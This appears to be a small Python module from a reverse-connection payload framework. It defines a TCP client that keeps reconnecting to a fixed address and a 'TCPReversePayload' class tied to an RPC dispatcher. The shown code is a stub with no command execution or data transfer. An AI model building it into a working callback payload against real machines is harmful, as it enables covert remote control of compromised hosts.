# -*- coding: utf-8 -*-

import socket
import time

from .payload import PayloadRPCDispatcher


class TCPClient:

    def __init__(self, addr, retry_interval=1):
        self.addr = addr
        self.retry_interval = retry_interval

    def connect_forever(self):
        while True:
            sock = socket.create_connection(self.addr)
            time.sleep(self.retry_interval)


class TCPReversePayload(TCPClient, PayloadRPCDispatcher):
    
    def __init__(self, addr, retry_interval=1):
        TCPClient.__init__(self, addr, retry_interval)

